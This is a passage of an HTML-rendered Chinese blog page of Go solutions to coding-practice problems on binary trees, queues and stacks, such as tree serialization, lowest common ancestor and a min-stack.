class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return int整型二维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Print</span><span class="params">( pRoot *TreeNode )</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    q := []*TreeNode&#123;pRoot&#125;</span><br><span class="line">    tmpans := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    tmpq := []*TreeNode&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(q)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        length := <span class="built_in">len</span>(q)</span><br><span class="line">        tmpans = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">        tmpq = []*TreeNode&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;length;i++ &#123;</span><br><span class="line">            tmpans = <span class="built_in">append</span>(tmpans,q[i].Val)</span><br><span class="line">            <span class="keyword">if</span> q[i].Left != <span class="literal">nil</span> &#123;</span><br><span class="line">                tmpq = <span class="built_in">append</span>(tmpq,q[i].Left)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> q[i].Right != <span class="literal">nil</span> &#123;</span><br><span class="line">                tmpq = <span class="built_in">append</span>(tmpq,q[i].Right)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="built_in">append</span>(ans,tmpans)</span><br><span class="line">        q = tmpq</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="序列化二叉树"><a href="#序列化二叉树" class="headerlink" title="序列化二叉树"></a>序列化二叉树</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return TreeNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Serialize</span><span class="params">(root *TreeNode)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line">sb := &amp;strings.Builder&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> dfs <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span></span><br><span class="line">dfs = <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">sb.WriteString(<span class="string">&quot;#,&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">sb.WriteString(strconv.Itoa(root.Val))</span><br><span class="line">sb.WriteString(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">dfs(root.Left)</span><br><span class="line">dfs(root.Right)</span><br><span class="line">&#125;</span><br><span class="line">dfs(root)</span><br><span class="line"><span class="comment">//     fmt.Println(sb.String())</span></span><br><span class="line"><span class="keyword">return</span> sb.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deserialize</span><span class="params">(s <span class="keyword">string</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line">sp := strings.Split(s, <span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> dfs <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">TreeNode</span></span></span><br><span class="line">dfs = <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sp) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> sp[<span class="number">0</span>] == <span class="string">&quot;#&quot;</span> &#123;</span><br><span class="line">sp = sp[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">num, _ := strconv.Atoi(sp[<span class="number">0</span>])</span><br><span class="line">sp = sp[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> &amp;TreeNode&#123;num, dfs(), dfs()&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dfs()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树中和为某一值的路径-三"><a href="#二叉树中和为某一值的路径-三" class="headerlink" title="二叉树中和为某一值的路径(三)"></a>二叉树中和为某一值的路径(三)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNode类 </span></span><br><span class="line"><span class="comment"> * @param sum int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindPath</span><span class="params">(root *TreeNode, sum <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line">ans := <span class="number">0</span></span><br><span class="line">maps := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line">maps[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment">// 闭包函数递归自己。</span></span><br><span class="line"><span class="keyword">var</span> dfsl <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode, currentSum <span class="keyword">int</span>)</span></span></span><br><span class="line">dfsl = <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode, currentSum <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">currentSum += root.Val</span><br><span class="line"><span class="keyword">if</span> _, ok := maps[currentSum-sum]; ok &#123;</span><br><span class="line">ans += maps[currentSum-sum]</span><br><span class="line">&#125;</span><br><span class="line">maps[currentSum]++</span><br><span class="line">dfsl(root.Left, currentSum)</span><br><span class="line">dfsl(root.Right, currentSum)</span><br><span class="line">maps[currentSum]--</span><br><span class="line">&#125;</span><br><span class="line">dfsl(root, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在二叉树中找到两个节点的最近公共祖先"><a href="#在二叉树中找到两个节点的最近公共祖先" class="headerlink" title="在二叉树中找到两个节点的最近公共祖先"></a>在二叉树中找到两个节点的最近公共祖先</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNode类 </span></span><br><span class="line"><span class="comment"> * @param o1 int整型 </span></span><br><span class="line"><span class="comment"> * @param o2 int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lowestCommonAncestor</span><span class="params">( root *TreeNode ,  o1 <span class="keyword">int</span> ,  o2 <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    node := lCA(root, o1, o2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> node.Val</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lCA</span><span class="params">(root *TreeNode, o1 <span class="keyword">int</span>, o2 <span class="keyword">int</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span> || root.Val == o1 || root.Val == o2 &#123;</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//     lCA求得o1、o2的最近公共祖先，left去左子树中寻找，right去右子树中寻找</span></span><br><span class="line"><span class="comment">//     left为空说明左子树中不存在，我们去右子树中寻找即可；right为空说明右子树中不存在，我们</span></span><br><span class="line"><span class="comment">//     去左子树中寻找；当left、right均不为空时，说明两个节点分别坐落于left和right中，返回</span></span><br><span class="line"><span class="comment">//     此时的根节点root即可</span></span><br><span class="line">    left := lCA(root.Left, o1, o2)</span><br><span class="line">    right := lCA(root.Right, o1, o2)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> left == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> right</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> right == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNode类 </span></span><br><span class="line"><span class="comment"> * @param p int整型 </span></span><br><span class="line"><span class="comment"> * @param q int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lowestCommonAncestor</span><span class="params">( root *TreeNode ,  p <span class="keyword">int</span> ,  q <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> root.Val &gt; p &amp;&amp; root.Val &gt; q &#123;</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root.Left,p,q)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> root.Val &lt; p &amp;&amp; root.Val &lt; q &#123;</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root.Right,p,q)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root.Val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="队列-amp-栈"><a href="#队列-amp-栈" class="headerlink" title="队列 &amp; 栈"></a>队列 &amp; 栈</h2><h3 id="用两个栈实现队列"><a href="#用两个栈实现队列" class="headerlink" title="用两个栈实现队列"></a><strong>用两个栈实现队列</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stack1 [] <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> stack2 [] <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push</span><span class="params">(node <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    stack1 = <span class="built_in">append</span>(stack1, node)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(stack2) == <span class="number">0</span>&#123;</span><br><span class="line">       <span class="keyword">for</span> idx := <span class="built_in">len</span>(stack1) - <span class="number">1</span>; idx &gt; <span class="number">-1</span>; idx--&#123;</span><br><span class="line">            stack2 = <span class="built_in">append</span>(stack2, stack1[idx])</span><br><span class="line">        &#125;</span><br><span class="line">        stack1 = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    nums := stack2[<span class="built_in">len</span>(stack2)<span class="number">-1</span>]</span><br><span class="line">    stack2 = stack2[:<span class="built_in">len</span>(stack2)<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包含min函数的栈"><a href="#包含min函数的栈" class="headerlink" title="包含min函数的栈"></a><strong>包含min函数的栈</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stack []<span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> minStack []<span class="keyword">int</span> = []<span class="keyword">int</span>&#123;math.MaxInt64&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push</span><span class="params">(node <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    stack = <span class="built_in">append</span>(stack, node)</span><br><span class="line">minTop := min(node, minStack[<span class="built_in">len</span>(minStack)<span class="number">-1</span>])</span><br><span class="line">minStack = <span class="built_in">append</span>(minStack, minTop)</span><br><span class="linespan><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pop</span><span class="params">()</span></span> &#123;</span><br><span class="line">stack = stack[:<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">minStack = minStack[:<span class="built_in">len</span>(minStack)<span class="number">-1</span>]    <span class="comment">// write code here</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Top</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Min</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> minStack[<span class="built_in">len</span>(minStack)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &lt;= b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**container/list解法</span></span><br><span class="line"><span class="comment">package main</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">import &quot;container/list&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var mylist = list.New()</span></span><br><span class="line"><span class="comment">var minlist = list.New()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func Push(node int) &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">mylist.PushFront(node)</span></span><br><span class="line"><span class="comment">if minlist.Len() == 0 &#123;</span></span><br><span class="line"><span class="comment">minlist.PushFront(node)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if node &lt;= minlist.Front().Value.(int) &#123;</span></span><br><span class="line"><span class="comment">minlist.PushFront(node)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">func Pop() &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">if mylist.Front().Value == minlist.Front().Value &#123;</span></span><br><span class="line"><span class="comment">minlist.Remove(minlist.Front())</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">mylist.Remove(mylist.Front())</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">func Top() int &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">return mylist.Front().Value.(int)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">func Min() int &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">return minlist.Front().Value.(int)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="栈的压入、弹出序列"><a href="#栈的压入、弹出序列" class="headerlink" title="栈的压入、弹出序列"></a><strong>栈的压入、弹出序列</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pushV int整型一维数组 </span></span><br><span class="line"><span class="comment"> * @param popV int整型一维数组 </span></span><br><span class="line"><span class="comment"> * @return bool布尔型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsPopOrder</span><span class="params">( pushV []<span class="keyword">int</span> ,  popV []<span class="keyword">int</span> )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="comment">//队列入栈，然后判断是否是出战序列，</span></span><br><span class="line">    <span class="comment">//是的话出战，不是的话继续入栈，直到入栈结束未能匹配完成</span></span><br><span class="line">    <span class="keyword">var</span> stack=<span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">0</span>,<span class="built_in">len</span>(pushV))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(popV)==<span class="number">0</span>||<span class="built_in">len</span>(pushV)==<span class="number">0</span>||<span class="built_in">len</span>(popV)!=<span class="built_in">len</span>(pushV)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//入栈</span></span><br><span class="line">    <span class="keyword">for</span> _,v:=<span class="keyword">range</span> pushV&#123;</span><br><span class="line">            stack=<span class="built_in">append</span>(stack,v)</span><br><span class="line">         <span class="keyword">for</span> <span class="built_in">len</span>(stack)!=<span class="number">0</span>&amp;&amp;stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>]==popV[<span class="number">0</span>]&#123;</span><br><span class="line">                 stack=stack[:<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">                 popV=popV[<span class="number">1</span>:<span class="built_in">len</span>(popV)]</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">len</span>(stack)==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="翻转单词序列"><a href="#翻转单词序列" class="headerlink" title="翻转单词序列"></a><strong>翻转单词序列</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 